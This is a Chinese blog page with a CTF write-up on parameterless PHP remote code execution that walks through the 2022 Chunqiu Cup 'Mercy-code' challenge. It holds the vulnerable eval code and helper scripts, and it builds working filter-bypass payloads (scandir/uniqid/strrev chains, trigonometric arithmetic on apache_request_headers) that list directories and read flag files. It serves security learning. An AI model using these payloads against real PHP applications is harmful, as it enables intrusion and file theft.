@@ -1,0 +1,223 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>标签: CTF | 云</title><meta name="author" content="NYG"><meta name="copyright" content="NYG"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="这里我写一个关于无参数 rce 的总结，之前一直遇到就是传统的无参数，没有过滤函数。 # RCE 主题之无参数 常规的无参数 rce 题目，要求字母开头跟着 () 镶嵌.  举例 12var_dump(get_cwd());system(next(getallheaders())); 这种形式可以符合题型要求 123if(&amp;#x27;;&amp;#x27; &#x3D;&#x3D;&#x3D; preg_replace(&amp;#x27;&#x2F;">
+<meta property="og:type" content="website">
+<meta property="og:title" content="CTF">
+<meta property="og:url" content="https://pannnnkx.cn/CTF/%E6%97%A0%E5%8F%82%E6%95%B0rce%E4%B8%93%E9%A2%98.html">
+<meta property="og:site_name" content="云">
+<meta property="og:description" content="这里我写一个关于无参数 rce 的总结，之前一直遇到就是传统的无参数，没有过滤函数。 # RCE 主题之无参数 常规的无参数 rce 题目，要求字母开头跟着 () 镶嵌.  举例 12var_dump(get_cwd());system(next(getallheaders())); 这种形式可以符合题型要求 123if(&amp;#x27;;&amp;#x27; &#x3D;&#x3D;&#x3D; preg_replace(&amp;#x27;&#x2F;">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://pannnnkx.cn/img/NYG.jpg">
+<meta property="article:published_time" content="2024-03-19T15:14:08.000Z">
+<meta property="article:modified_time" content="2024-03-19T15:12:05.255Z">
+<meta property="article:author" content="NYG">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://pannnnkx.cn/img/NYG.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://pannnnkx.cn/CTF/%E6%97%A0%E5%8F%82%E6%95%B0rce%E4%B8%93%E9%A2%98.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=4.13.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.11.1/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyload: true,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '标签: CTF',
+  isPost: false,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: false,
+  postUpdate: '2024-03-19 23:12:05'
+}</script><script>(win=>{
+      win.saveToLocal = {
+        set: (key, value, ttl) => {
+          if (ttl === 0) return
+          const now = Date.now()
+          const expiry = now + ttl * 86400000
+          const item = {
+            value,
+            expiry
+          }
+          localStorage.setItem(key, JSON.stringify(item))
+        },
+      
+        get: key => {
+          const itemStr = localStorage.getItem(key)
+      
+          if (!itemStr) {
+            return undefined
+          }
+          const item = JSON.parse(itemStr)
+          const now = Date.now()
+      
+          if (now > item.expiry) {
+            localStorage.removeItem(key)
+            return undefined
+          }
+          return item.value
+        }
+      }
+    
+      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        script.onerror = reject
+        script.onload = script.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          script.onload = script.onreadystatechange = null
+          resolve()
+        }
+
+        Object.keys(attr).forEach(key => {
+          script.setAttribute(key, attr[key])
+        })
+
+        document.head.appendChild(script)
+      })
+    
+      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onerror = reject
+        link.onload = link.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          link.onload = link.onreadystatechange = null
+          resolve()
+        }
+        document.head.appendChild(link)
+      })
+    
+      win.activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+        if (t === 'dark') activateDarkMode()
+        else if (t === 'light') activateLightMode()
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+      const detectApple = () => {
+        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+          document.documentElement.classList.add('apple')
+        }
+      }
+      detectApple()
+    })(window)</script><meta name="generator" content="Hexo 6.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/NYG.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">30</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">3</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-graduation-cap"></i><span> 博文</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/CTF/"><i class="fa-fw fa fa-folder-open"></i><span> CTF</span></a></li></ul></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 生活</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/shuoshuo/"><i class="fa-fw fa fa-comments-o"></i><span> 分享</span></a></li><li><a class="site-page child" href="/photos/"><i class="fa-fw fa fa-camera-retro"></i><span> 相册</span></a></li><li><a class="site-page child" href="/music/"><i class="fa-fw fa fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 影视</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/links/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/comment/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于笔者</span></a></div></div></div></div><div class="page" id="body-wrap"><header class="not-home-page" id="page-header" style="background-image: url('/img/luoye.jpg')"><nav id="nav"><span id="blog-info"><a href="/" title="云"><span class="site-name">云</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-graduation-cap"></i><span> 博文</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/CTF/"><i class="fa-fw fa fa-folder-open"></i><span> CTF</span></a></li></ul></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 生活</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/shuoshuo/"><i class="fa-fw fa fa-comments-o"></i><span> 分享</span></a></li><li><a class="site-page child" href="/photos/"><i class="fa-fw fa fa-camera-retro"></i><span> 相册</span></a></li><li><a class="site-page child" href="/music/"><i class="fa-fw fa fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 影视</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/links/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/comment/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于笔者</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="page-site-info"><h1 id="site-title">CTF</h1></div></header><main class="layout" id="content-inner"><div id="page"><div id="article-container"><p>这里我写一个关于无参数 rce 的总结，之前一直遇到就是传统的无参数，没有过滤函数。</p>
+<h2 id="rce主题之无参数"><a class="markdownIt-Anchor" href="#rce主题之无参数">#</a> RCE 主题之无参数</h2>
+<p>常规的无参数 rce 题目，要求字母开头跟着 () 镶嵌.<br>
+ 举例</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var_dump(get_cwd());</span><br><span class="line">system(<span class="built_in">next</span>(getallheaders()));</span><br></pre></td></tr></table></figure>
+<p>这种形式可以符合题型要求</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="string">&#x27;;&#x27;</span> === preg_replace(<span class="string">&#x27;/[^\W]+\((?R)?\)/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, $_GET[<span class="string">&#x27;star&#x27;</span>])) &#123;    </span><br><span class="line">    <span class="built_in">eval</span>(\$_GET[<span class="string">&#x27;star&#x27;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>但如果题目进行升级，过滤 var_dump，system 等这些常规函数，有哪些特别函数可以用来进行 rce，又该如何构造？<br>
+ 这里以 [2022 春秋杯] Mercy-code 来进行讲解，明显发现题目变化主要在过滤，\w 换成了 [a-z_] 其实就是大写和数字去掉了，本来也不影响的。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]) &#123;</span><br><span class="line">    <span class="variable">$cmd</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="string">&#x27;;&#x27;</span> === <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[a-z_]+\((?R)?\)/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$cmd</span>)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/file|if|localeconv|phpversion|sqrt|et|na|nt|strlen|info|path|rand|dec|bin|hex|oct|pi|exp|log|var_dump|pos|current|array|time|se|ord/i&#x27;</span>, <span class="variable">$cmd</span>)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;What are you thinking?&#x27;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="variable">$cmd</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;Please calm down&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>这里因为能力有限，脚本函数都是取自大佬的，根源是谁也不知道，但学习就对了。<br>
+获取 PHP 内置函数</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="title function_ invoke__">get_defined_functions</span>()[<span class="string">&#x27;internal&#x27;</span>];</span><br><span class="line"><span class="variable">$file</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&quot;function.txt&quot;</span>,<span class="string">&quot;w+&quot;</span>);</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$a</span> <span class="keyword">as</span> <span class="variable">$key</span> ) &#123;</span><br><span class="line"> <span class="keyword">echo</span> <span class="title function_ invoke__">fputs</span>(<span class="variable">$file</span>,<span class="variable">$key</span>.<span class="string">&quot;\r\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$file</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>查找能使用的函数</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&#x27;function.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> f:</span><br><span class="line">    function = re.findall(<span class="string">r&#x27;/file|if|localeconv|phpversion|sqrt|et|na|nt|strlen|info|path|rand|dec|bin|hex|oct|pi|exp|log|var_dump|pos|current|array|time|se|ord/i&#x27;</span>,i) </span><br><span class="line">    <span class="keyword">if</span> function == [] <span class="keyword">and</span> <span class="keyword">not</span> <span class="string">&#x27;_&#x27;</span> <span class="keyword">in</span> i:</span><br><span class="line">        <span class="built_in">print</span>(i)</span><br></pre></td></tr></table></figure>
+<p>这里能找到很多函数，我是从别人的经验里总结了几种方法</p>
+<p>uniqid (), 这个函数前部分的内容是不变的，每次改变的是后面的内容，自己多次运行后发现前五位是不变的<br>
+<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/CTF/%E6%97%A0%E5%8F%82%E6%95%B0rce%E4%B8%93%E9%A2%98.htm/Image1.jpg" alt="做题1"></p>
+<p>strrev () 函数将字符串反转<br>
+<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/CTF/%E6%97%A0%E5%8F%82%E6%95%B0rce%E4%B8%93%E9%A2%98.htm/Image2.jpg" alt="做题1"></p>
+<p>chr 生成 ASCII 的对应字符<br>
+那我们通过 strrev 取出随机的 unqid 产生的数字进行转码就能有机会构造出.<br>
+ 我们目标就是先构造能读取当前目录的函数表达式<br>
+通过这脚本可以发现是有机会生成。的</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="number">1000</span>;<span class="variable">$i</span>++)</span><br><span class="line"><span class="keyword">echo</span>(<span class="title function_ invoke__">chr</span>(<span class="title function_ invoke__">strrev</span>(<span class="title function_ invoke__">uniqid</span>())));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/CTF/%E6%97%A0%E5%8F%82%E6%95%B0rce%E4%B8%93%E9%A2%98.htm/Image3.jpg" alt="做题1"><br>
+ <code>这里有一点注意，只有php7版本以下对类型不敏感，否则会报错显示chr('12313123'）这种无法转化字符串的.</code> <br>
+scandir () 返回目录<br>
+生成<br>
+ <code>scandir(chr(strrev(unqid))</code> <br>
+ 找到 implode 函数<br>
+ implode () 将一维数组转换成字符串<br>
+ die () 结束进程，并输出内容，等同于 exit（）<br>
+echo 可以用 die 代替<br>
+发现成功<br>
+<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/CTF/%E6%97%A0%E5%8F%82%E6%95%B0rce%E4%B8%93%E9%A2%98.htm/Image4.jpg" alt="做题1"><br>
+ 发现疑似 flag 文件在尾部<br>
+然后就是读取文件，这里利用 end () 函数得到文件名</p>
+<p><code>end() 将数组的内部指针指向最后一个单元</code> <br>
+ <code>show_source() 语法高亮一个文件 highlight_file() 别名</code> <br>
+ show_source 可以用 file 代替<br>
+成功</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd=<span class="title function_ invoke__">show_source</span>(<span class="title function_ invoke__">end</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">chr</span>(<span class="title function_ invoke__">strrev</span>(<span class="title function_ invoke__">uniqid</span>())))));</span><br></pre></td></tr></table></figure>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/CTF/%E6%97%A0%E5%8F%82%E6%95%B0rce%E4%B8%93%E9%A2%98.htm/Image5.jpg" alt="做题1"><br>
+ 但这里我们如果再提高难度，不在当前目录怎么办？，在上一级的目录<br>
+ chdir (’…’) 是 PHP 中用于改变当前工作目录的函数 <code>要跳转到上层目录需要构造两个点即chdir('..')</code> <br>
+ 从当前目录返回的值我们有经验知道第二个数组里面就是 <code>'..'</code> , 我们可以用 next 来获取第二个数值</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd=echo(implode(scandir(<span class="built_in">next</span>(scandir(<span class="built_in">chr</span>(strrev(uniqid())))))));</span><br></pre></td></tr></table></figure>
+<p>成功<br>
+<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/CTF/%E6%97%A0%E5%8F%82%E6%95%B0rce%E4%B8%93%E9%A2%98.htm/Image6.jpg" alt="做题1"><br>
+<strong> 还有人问根目录呢？前面随机里本就有 / 出现，同样可以读取到。</strong><br>
+再增加难度，如果说这个 unqid 不能使用怎么办.</p>
+<h3 id="方法plus"><a class="markdownIt-Anchor" href="#方法plus">#</a> 方法 plus</h3>
+<p>搜索 headers 头查找到 apache_request_headers ()</p>
+<p>发现 end (apache_request_headers () 可以获得 80</p>
+<p>通过三角函数我们尝试去获得 46，chr (46)=’.’<br>
+ceil () 是 PHP 中用于向上取整的函数<br>
+<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/CTF/%E6%97%A0%E5%8F%82%E6%95%B0rce%E4%B8%93%E9%A2%98.htm/Image7.jpg" alt="做题1"><br>
+ 具体方法自己调试<br>
+得到如下 payload</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">ceil</span>(<span class="title function_ invoke__">sinh</span>(<span class="title function_ invoke__">cosh</span>(<span class="title function_ invoke__">tan</span>(<span class="title function_ invoke__">ceil</span>(<span class="title function_ invoke__">cosh</span>(<span class="title function_ invoke__">sin</span>(<span class="title function_ invoke__">tan</span>(<span class="title function_ invoke__">end</span>(<span class="title function_ invoke__">apache_request_headers</span>()))))))))) <span class="comment">// 通过运算得到 46 </span></span><br><span class="line">然后我们找到flag位置输出即可</span><br><span class="line"></span><br><span class="line">cmd=<span class="title function_ invoke__">show_source</span>(<span class="title function_ invoke__">end</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">chr</span>(<span class="title function_ invoke__">ceil</span>(<span class="title function_ invoke__">sinh</span>(<span class="title function_ invoke__">cosh</span>(<span class="title function_ invoke__">tan</span>(<span class="title function_ invoke__">ceil</span>(<span class="title function_ invoke__">cosh</span>(<span class="title function_ invoke__">sin</span>(<span class="title function_ invoke__">tan</span>(<span class="title function_ invoke__">end</span>(<span class="title function_ invoke__">apache_request_headers</span>())))))))))))));</span><br></pre></td></tr></table></figure>
+<p>除此之外其实还有很多例如<br>
+ <code>cmd=show_source(end(scandir(next(each(str_split(spl_autoload_extensions()))))));</code> <br>
+ 大家可以自己去研究尝试一下，也许下一次的题就是出题人自己研究的。</p>
+</div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/NYG.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">NYG</div><div class="author-info__description">more and more</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">30</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">3</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://blog.csdn.net/NYG694?spm=1000.2115.3001.5343"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">A sophomore student.</div></div><div class="sticky_layout"><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2024/03/19/%E6%97%A0%E5%8F%82%E6%95%B0rce%E4%B8%93%E9%A2%98/" title="无参数rce专题"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img2.imgtp.com/2024/03/19/8WMhHkkp.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="无参数rce专题"/></a><div class="content"><a class="title" href="/2024/03/19/%E6%97%A0%E5%8F%82%E6%95%B0rce%E4%B8%93%E9%A2%98/" title="无参数rce专题">无参数rce专题</a><time datetime="2024-03-19T15:14:08.000Z" title="发表于 2024-03-19 23:14:08">2024-03-19</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/03/18/Day%20by%20Day/" title="Day by Day"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img2.imgtp.com/2024/03/15/kidcMJAi.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Day by Day"/></a><div class="content"><a class="title" href="/2024/03/18/Day%20by%20Day/" title="Day by Day">Day by Day</a><time datetime="2024-03-18T14:30:12.000Z" title="发表于 2024-03-18 22:30:12">2024-03-18</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/03/18/Reverse%20%E5%BC%82%E4%B8%96%E7%95%8C%E7%9A%84%E9%AD%94%E6%B3%95/" title="Reverse 异世界的魔法"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img2.imgtp.com/2024/03/18/SsJN0QxH.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Reverse 异世界的魔法"/></a><div class="content"><a class="title" href="/2024/03/18/Reverse%20%E5%BC%82%E4%B8%96%E7%95%8C%E7%9A%84%E9%AD%94%E6%B3%95/" title="Reverse 异世界的魔法">Reverse 异世界的魔法</a><time datetime="2024-03-18T13:09:32.000Z" title="发表于 2024-03-18 21:09:32">2024-03-18</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/03/11/VikeCTF/" title="VikeCTF">VikeCTF</a><time datetime="2024-03-11T05:52:02.000Z" title="发表于 2024-03-11 13:52:02">2024-03-11</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/03/09/%E4%B8%80%E4%BA%9B%E5%A4%8D%E6%9D%82%E7%82%B9%E7%9A%84%E9%A2%98%E7%9B%AE/" title="一些复杂点的题目">一些复杂点的题目</a><time datetime="2024-03-09T08:05:24.000Z" title="发表于 2024-03-09 16:05:24">2024-03-09</time></div></div></div></div><div class="card-widget card-tags"><div class="item-headline"><i class="fas fa-tags"></i><span>标签</span></div><div class="card-tag-cloud"><a href="/tags/CTF/" style="font-size: 1.5em; color: #99a9bf">CTF</a> <a href="/tags/about/" style="font-size: 1.1em; color: #999">about</a> <a href="/tags/Reverse/" style="font-size: 1.1em; color: #999">Reverse</a></div></div><div class="card-widget card-archives"><div class="item-headline"><i class="fas fa-archive"></i><span>归档</span></div><ul class="card-archive-list"><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/03/"><span class="card-archive-list-date">三月 2024</span><span class="card-archive-list-count">7</span></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/02/"><span class="card-archive-list-date">二月 2024</span><span class="card-archive-list-count">1</span></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/01/"><span class="card-archive-list-date">一月 2024</span><span class="card-archive-list-count">1</span></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2023/10/"><span class="card-archive-list-date">十月 2023</span><span class="card-archive-list-count">3</span></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2023/09/"><span class="card-archive-list-date">九月 2023</span><span class="card-archive-list-count">1</span></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2023/08/"><span class="card-archive-list-date">八月 2023</span><span class="card-archive-list-count">16</span></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2023/07/"><span class="card-archive-list-date">七月 2023</span><span class="card-archive-list-count">1</span></a></li></ul></div><div class="card-widget card-webinfo"><div class="item-headline"><i class="fas fa-chart-line"></i><span>网站资讯</span></div><div class="webinfo"><div class="webinfo-item"><div class="item-name">文章数目 :</div><div class="item-count">30</div></div><div class="webinfo-item"><div class="item-name">本站访客数 :</div><div class="item-count" id="busuanzi_value_site_uv"><i class="fa-solid fa-spinner fa-spin"></i></div></div><div class="webinfo-item"><div class="item-name">本站总访问量 :</div><div class="item-count" id="busuanzi_value_site_pv"><i class="fa-solid fa-spinner fa-spin"></i></div></div><div class="webinfo-item"><div class="item-name">最后更新时间 :</div><div class="item-count" id="last-push-date" data-lastPushDate="2024-03-19T15:42:38.140Z"><i class="fa-solid fa-spinner fa-spin"></i></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2024 By NYG</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=4.13.0"></script><script src="/js/main.js?v=4.13.0"></script><script 